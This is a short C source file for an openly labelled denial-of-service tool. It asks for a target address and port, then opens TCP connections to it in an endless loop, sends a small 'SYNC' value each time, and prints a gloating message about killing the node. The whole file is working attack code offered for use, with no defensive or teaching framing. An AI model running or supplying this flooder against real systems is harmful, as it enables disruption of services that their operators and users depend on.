#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <memory.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <dirent.h> 

#define SYNC 1

int main(){
    char target_info[128];
    printf("Enter node that you would like to DoS in format ip:port\n");
    scanf("%s", target_info);
    char* ip = strtok(target_info,":");
    char* port = strtok(NULL, ":");
    struct sockaddr_in dest;
    inet_aton(ip, &dest.sin_addr);
    dest.sin_port = htons(atoi(port));
    dest.sin_family = AF_INET;

    int sockfd = 0, 
        sent_recv_bytes = 0;

    while(1){
        sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(connect(sockfd, (struct sockaddr*) &dest, sizeof(struct sockaddr)) < 0) printf("Connection to %s:%s failed\n",ip,port);
        else{ 
            int type = SYNC;
            sent_recv_bytes = sendto(sockfd, &type, sizeof(int), 0, (struct sockaddr *)&dest, sizeof(struct sockaddr));
            printf("Eee boy. He will die\n");
        }
        close(sockfd);
    }
   
    return 0;
}
